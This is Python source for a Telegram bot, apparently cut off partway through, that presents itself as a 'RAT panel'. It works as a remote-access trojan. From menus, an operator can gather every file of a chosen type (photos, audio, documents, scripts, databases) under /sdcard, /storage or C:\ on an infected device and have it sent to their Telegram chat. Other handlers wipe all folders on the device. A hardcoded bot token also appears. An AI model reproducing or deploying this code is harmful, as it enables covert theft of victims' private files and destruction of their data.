import os
import shutil
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
				
bot = Bot(token='5991395819:AAHiiXcSh8q6rosEZyEPrvMQrpvhEnbOBIE')
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

admins=["1283068491"]

admin = 1283068491

@dp.message_handler(Command('start'))
async def start_command(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add('📱sᴅᴄᴀʀᴅ','💾 ғʟᴀsʜᴄᴀʀᴅ')
    keyboard.add('💻 ғᴏʀ ᴡɪɴᴅᴏᴡs')
    await message.reply('🗄 ᴡᴇʟᴄᴏᴍᴇ ʀᴀᴛ ᴘᴀɴᴇʟ\n\n🖥 ᴠɪᴇᴠ sᴅᴄᴀʀᴅ /sdcard\n🖥 ᴠɪᴇᴠ ғʟᴀsʜ ᴄᴀʀᴅ /flashcard', reply_markup=keyboard)


@dp.message_handler(text='📱sᴅᴄᴀʀᴅ')
async def click_button(message: types.Message):
    keyboard = types.InlineKeyboardMarkup()
    png = types.InlineKeyboardButton(text="🌃 ᴘɴɢ ɪᴍᴀɢᴇs", callback_data="png")
    jpg = types.InlineKeyboardButton(text="🏙 ᴊᴘɢ ɪᴍᴀɢᴇs", callback_data="jpg")
    music = types.InlineKeyboardButton(text="🎧 ᴍᴜsɪᴄ ғɪʟᴇs", callback_data="music")
    voice = types.InlineKeyboardButton(text="🎤 ᴠᴏɪᴄᴇ ғɪʟᴇs", callback_data="voice")
    video = types.InlineKeyboardButton(text="🎞 ᴠɪᴅᴇᴏ ғɪʟᴇs", callback_data="video")
    zip = types.InlineKeyboardButton(text="🗂 ᴢɪᴘ ғɪʟᴇs", callback_data="zip")
    text = types.InlineKeyboardButton(text="📄 ᴛᴇxᴛ ғɪʟᴇs", callback_data="text")
    pdf = types.InlineKeyboardButton(text="📚 ᴘᴅғ ғɪʟᴇs", callback_data="pdf")
    apk = types.InlineKeyboardButton(text="💾 ᴀᴘᴋ ғɪʟᴇs", callback_data="apk")
    py = types.InlineKeyboardButton(text="🐍 ᴘʏᴛʜᴏɴ ғɪʟᴇs", callback_data="py")
    php = types.InlineKeyboardButton(text="🐘 ᴘʜᴘ ғɪʟᴇs", callback_data="php")
    js = types.InlineKeyboardButton(text="♨️ ᴊs ғɪʟᴇs", callback_data="js")
    sql = types.InlineKeyboardButton(text="🗃 sǫʟ ʙᴀᴢᴀ ғɪʟᴇs", callback_data="sql")
    exe = types.InlineKeyboardButton(text="💻 ᴇxᴇ ғɪʟᴇs", callback_data="exe")
    sdcarddel = types.InlineKeyboardButton(text="🗄 ᴅᴇʟᴇᴛᴇ ғᴜʟʟ sᴅᴄᴀʀᴅ", callback_data="-sdcard")
    bash = types.InlineKeyboardButton(text="🟢 ʙᴀsʜ ғɪʟᴇs", callback_data="bash")
    log = types.InlineKeyboardButton(text="🖨 ʟᴏɢ ғɪʟᴇs", callback_data="log")
    rar = types.InlineKeyboardButton(text="📦 ʀᴀʀ ғɪʟᴇs", callback_data="rar")
    tgs = types.InlineKeyboardButton(text="📝 ᴛɢs ғɪʟᴇs", callback_data="tgs")
    obb = types.InlineKeyboardButton(text="🎮 ᴏʙʙ ғɪʟᴇs", callback_data="obb")
    webp = types.InlineKeyboardButton(text="🌐 ᴡᴇʙᴘ ғɪʟᴇs", callback_data="webp")
    keyboard.add(png,jpg)
    keyboard.add(music,video)
    keyboard.add(voice,zip)
    keyboard.add(text,pdf)
    keyboard.add(apk,py)
    keyboard.add(php,js)
    keyboard.add(sql,exe)
    keyboard.add(bash,log)
    keyboard.add(rar,tgs)
    keyboard.add(obb,webp)
    keyboard.add(sdcarddel)
    await message.reply("🎛 ᴡᴇᴄᴏᴍᴇ ʀᴀᴛ ᴘᴀɴᴇʟ", reply_markup=keyboard)



#ᴘɴɢ ɪᴍᴀɢᴇs

@dp.callback_query_handler(lambda query: query.data == 'png')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".png"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴊᴘɢ ɪᴍᴀɢᴇs


@dp.callback_query_handler(lambda query: query.data == 'jpg')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".jpg"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)
            
            
#ᴍᴜsɪᴄ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'music')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".mp3"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴠɪᴅᴇᴏ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'video')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".mp4"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴢɪᴘ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'zip')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".zip"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴠᴏɪᴄᴇ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'voice')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".ogg"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)




#ᴛᴇxᴛ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'text')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".txt"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴘᴅғ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'pdf')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".pdf"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴘʏᴛʜᴏɴ ғɪʟᴇs

@dp.callback_query_handler(lambda query: query.data == 'py')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".py"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴀᴘᴋ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'apk')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".apk"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴘʜᴘ ғɪʟᴇs

@dp.callback_query_handler(lambda query: query.data == 'php')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".php"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴊᴀᴠᴀ sᴄʀɪᴘᴛ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'js')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".js"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#sǫʟ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'sql')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".sql"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴇxᴇ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'exe')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".exe"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ʙᴀsʜ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'bash')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".sh"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ʟᴏɢ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'log')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".log"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ʀᴀʀ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'rar')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".rar"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴛɢs ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'tgs')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".tgs"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴏʙʙ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'obb')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".obb"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴡᴇʙᴘ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == 'webp')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/sdcard"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".webp"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴅᴇʟᴇᴛᴇ ᴘᴀᴛʜs

pathdel=['/sdcard']

async def delete_path_to_admins():
    for path in pathdel:
        folder_name = os.path.basename(os.path.normpath(path))
        for file in os.listdir(path):
            file_path = os.path.join(path, file)
            if os.path.isdir(file_path):
                
                shutil.rmtree(file_path)
                
                for admin_id in admins:
                    await bot.send_message(chat_id=admin_id, text=f'🗂 folder {folder_name} deleted')
                    
@dp.callback_query_handler(lambda query: query.data == '-sdcard')
async def delete_folders_callback(query: types.CallbackQuery):
    await delete_path_to_admins()
    await query.answer('All folders on the device removed 🗂')


@dp.callback_query_handler(text='inline_button')
async def inline_button_handler(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id, 'You clicked the inline button!')
    
    
@dp.message_handler(text='💾 ғʟᴀsʜᴄᴀʀᴅ')
async def click_button(message: types.Message):
    keyboard = types.InlineKeyboardMarkup()
    png_a = types.InlineKeyboardButton(text="🌃 ᴘɴɢ ɪᴍᴀɢᴇs", callback_data="_png")
    jpg_a = types.InlineKeyboardButton(text="🏙 ᴊᴘɢ ɪᴍᴀɢᴇs", callback_data="_jpg")
    music_a = types.InlineKeyboardButton(text="🎧 ᴍᴜsɪᴄ ғɪʟᴇs", callback_data="_music")
    voice_a = types.InlineKeyboardButton(text="🎤 ᴠᴏɪᴄᴇ ғɪʟᴇs", callback_data="_voice")
    video_a = types.InlineKeyboardButton(text="🎞 ᴠɪᴅᴇᴏ ғɪʟᴇs", callback_data="_video")
    zip_a = types.InlineKeyboardButton(text="🗂 ᴢɪᴘ ғɪʟᴇs", callback_data="_zip")
    text_a = types.InlineKeyboardButton(text="📄 ᴛᴇxᴛ ғɪʟᴇs", callback_data="_text")
    pdf_a = types.InlineKeyboardButton(text="📚 ᴘᴅғ ғɪʟᴇs", callback_data="_pdf")
    apk_a = types.InlineKeyboardButton(text="💾 ᴀᴘᴋ ғɪʟᴇs", callback_data="_apk")
    py_a = types.InlineKeyboardButton(text="🐍 ᴘʏᴛʜᴏɴ ғɪʟᴇs", callback_data="_py")
    php_a = types.InlineKeyboardButton(text="🐘 ᴘʜᴘ ғɪʟᴇs", callback_data="_php")
    js_a = types.InlineKeyboardButton(text="♨️ ᴊs ғɪʟᴇs", callback_data="_js")
    sql_a = types.InlineKeyboardButton(text="🗃 sǫʟ ʙᴀᴢᴀ ғɪʟᴇs", callback_data="_sql")
    exe_a = types.InlineKeyboardButton(text="💻 ᴇxᴇ ғɪʟᴇs", callback_data="_exe")
    sdcarddel_a = types.InlineKeyboardButton(text="🗄 ᴅᴇʟᴇᴛᴇ ғᴜʟʟ ғʟᴇsʜ ᴄᴀʀᴅ", callback_data="_-sdcard")
    bash_a = types.InlineKeyboardButton(text="🟢 ʙᴀsʜ ғɪʟᴇs", callback_data="_bash")
    log_a = types.InlineKeyboardButton(text="🖨 ʟᴏɢ ғɪʟᴇs", callback_data="_log")
    rar_a = types.InlineKeyboardButton(text="📦 ʀᴀʀ ғɪʟᴇs", callback_data="_rar")
    tgs_a = types.InlineKeyboardButton(text="📝 ᴛɢs ғɪʟᴇs", callback_data="_tgs")
    obb_a = types.InlineKeyboardButton(text="🎮 ᴏʙʙ ғɪʟᴇs", callback_data="_obb")
    webp_a = types.InlineKeyboardButton(text="🌐 ᴡᴇʙᴘ ғɪʟᴇs", callback_data="_webp")
    keyboard.add(png_a,jpg_a)
    keyboard.add(music_a,video_a)
    keyboard.add(voice_a,zip_a)
    keyboard.add(text_a,pdf_a)
    keyboard.add(apk_a,py_a)
    keyboard.add(php_a,js_a)
    keyboard.add(sql_a,exe_a)
    keyboard.add(bash_a,log_a)
    keyboard.add(rar_a,tgs_a)
    keyboard.add(obb_a,webp_a)
    keyboard.add(sdcarddel_a)
    await message.reply("🎛 ᴡᴇᴄᴏᴍᴇ ʀᴀᴛ ᴘᴀɴᴇʟ", reply_markup=keyboard)



#ᴘɴɢ ɪᴍᴀɢᴇs

@dp.callback_query_handler(lambda query: query.data == '_png')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".png"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴊᴘɢ ɪᴍᴀɢᴇs


@dp.callback_query_handler(lambda query: query.data == '_jpg')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".jpg"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)
            
            
#ᴍᴜsɪᴄ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_music')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".mp3"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴠɪᴅᴇᴏ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_video')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".mp4"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴢɪᴘ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_zip')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".zip"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴠᴏɪᴄᴇ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_voice')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".ogg"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)




#ᴛᴇxᴛ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_text')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".txt"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴘᴅғ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_pdf')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".pdf"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴘʏᴛʜᴏɴ ғɪʟᴇs

@dp.callback_query_handler(lambda query: query.data == '_py')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".py"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴀᴘᴋ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_apk')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".apk"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴘʜᴘ ғɪʟᴇs

@dp.callback_query_handler(lambda query: query.data == '_php')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".php"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴊᴀᴠᴀ sᴄʀɪᴘᴛ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_js')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".js"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#sǫʟ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_sql')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".sql"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴇxᴇ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_exe')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".exe"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ʙᴀsʜ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_bash')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".sh"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ʟᴏɢ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_log')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".log"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ʀᴀʀ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_rar')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".rar"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴛɢs ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_tgs')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".tgs"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴏʙʙ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_obb')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".obb"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴡᴇʙᴘ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_webp')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "/storage"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".webp"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)



#ᴅᴇʟᴇᴛᴇ ᴘᴀᴛʜs

pathdel=['/storage']

async def delete_flash_to_admins():
    for path in pathdel:
        folder_name = os.path.basename(os.path.normpath(path))
        for file in os.listdir(path):
            file_path = os.path.join(path, file)
            if os.path.isdir(file_path):
                
                shutil.rmtree(file_path)
                
                for admin_id in admins:
                    await bot.send_message(chat_id=admin_id, text=f'🗂 folder {folder_name} deleted')
                    
@dp.callback_query_handler(lambda query: query.data == '_-sdcard')
async def delete_folders_callback(query: types.CallbackQuery):
    await delete_flash_to_admins()
    await query.answer('All folders on the flashcard removed 🗂')



@dp.message_handler(text='💻 ғᴏʀ ᴡɪɴᴅᴏᴡs')
async def click_button(message: types.Message):
    keyboard = types.InlineKeyboardMarkup()
    png_a_ = types.InlineKeyboardButton(text="🌃 ᴘɴɢ ɪᴍᴀɢᴇs", callback_data="_png_")
    jpg_a_ = types.InlineKeyboardButton(text="🏙 ᴊᴘɢ ɪᴍᴀɢᴇs", callback_data="_jpg_")
    music_a_ = types.InlineKeyboardButton(text="🎧 ᴍᴜsɪᴄ ғɪʟᴇs", callback_data="_music_")
    voice_a_ = types.InlineKeyboardButton(text="🎤 ᴠᴏɪᴄᴇ ғɪʟᴇs", callback_data="_voice_")
    video_a_ = types.InlineKeyboardButton(text="🎞 ᴠɪᴅᴇᴏ ғɪʟᴇs", callback_data="_video_")
    zip_a_ = types.InlineKeyboardButton(text="🗂 ᴢɪᴘ ғɪʟᴇs", callback_data="_zip_")
    text_a_ = types.InlineKeyboardButton(text="📄 ᴛᴇxᴛ ғɪʟᴇs", callback_data="_text_")
    pdf_a_ = types.InlineKeyboardButton(text="📚 ᴘᴅғ ғɪʟᴇs", callback_data="_pdf_")
    apk_a_ = types.InlineKeyboardButton(text="💾 ᴀᴘᴋ ғɪʟᴇs", callback_data="_apk_")
    py_a_ = types.InlineKeyboardButton(text="🐍 ᴘʏᴛʜᴏɴ ғɪʟᴇs", callback_data="_py_")
    php_a_ = types.InlineKeyboardButton(text="🐘 ᴘʜᴘ ғɪʟᴇs", callback_data="_php_")
    js_a_ = types.InlineKeyboardButton(text="♨️ ᴊs ғɪʟᴇs", callback_data="_js_")
    sql_a_ = types.InlineKeyboardButton(text="🗃 sǫʟ ʙᴀᴢᴀ ғɪʟᴇs", callback_data="_sql_")
    exe_a_ = types.InlineKeyboardButton(text="💻 ᴇxᴇ ғɪʟᴇs", callback_data="_exe_")
    sdcarddel_a_ = types.InlineKeyboardButton(text="🗄 ᴅᴇʟᴇᴛᴇ ғᴜʟʟ ᴡɪɴᴅᴏᴡs ᴅᴀᴛᴀ", callback_data="_-sdcard_")
    bash_a_ = types.InlineKeyboardButton(text="🟢 ʙᴀsʜ ғɪʟᴇs", callback_data="_bash_")
    log_a_ = types.InlineKeyboardButton(text="🖨 ʟᴏɢ ғɪʟᴇs", callback_data="_log_")
    rar_a_ = types.InlineKeyboardButton(text="📦 ʀᴀʀ ғɪʟᴇs", callback_data="_rar_")
    tgs_a_ = types.InlineKeyboardButton(text="📝 ᴛɢs ғɪʟᴇs", callback_data="_tgs_")
    obb_a_ = types.InlineKeyboardButton(text="🎮 ᴏʙʙ ғɪʟᴇs", callback_data="_obb_")
    webp_a_ = types.InlineKeyboardButton(text="🌐 ᴡᴇʙᴘ ғɪʟᴇs", callback_data="_webp_")
    keyboard.add(png_a_,jpg_a_)
    keyboard.add(music_a_,video_a_)
    keyboard.add(voice_a_,zip_a_)
    keyboard.add(text_a_,pdf_a_)
    keyboard.add(apk_a_,py_a_)
    keyboard.add(php_a_,js_a_)
    keyboard.add(sql_a_,exe_a_)
    keyboard.add(bash_a_,log_a_)
    keyboard.add(rar_a_,tgs_a_)
    keyboard.add(obb_a_,webp_a_)
    keyboard.add(sdcarddel_a_)
    await message.reply("🎛 ᴡᴇᴄᴏᴍᴇ ʀᴀᴛ ᴘᴀɴᴇʟ", reply_markup=keyboard)



#ᴘɴɢ ɪᴍᴀɢᴇs

@dp.callback_query_handler(lambda query: query.data == '_png_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".png"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴊᴘɢ ɪᴍᴀɢᴇs


@dp.callback_query_handler(lambda query: query.data == '_jpg_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".jpg"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)
            
            
#ᴍᴜsɪᴄ ғɪʟᴇs


@dp.callback_query_handler(lambda query: query.data == '_music_')
async def check_files(callback_query: types.CallbackQuery):
    
    folder_path = "C:\\"
    file_list = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".mp3"):
                file_list.append(os.path.join(root, file))

    
    for file in file_list:
        with open(file, 'rb') as py_file:
            await bot.send_document(callback_query.from_user.id, py_file)


#ᴠɪᴅᴇᴏ ғɪʟᴇs


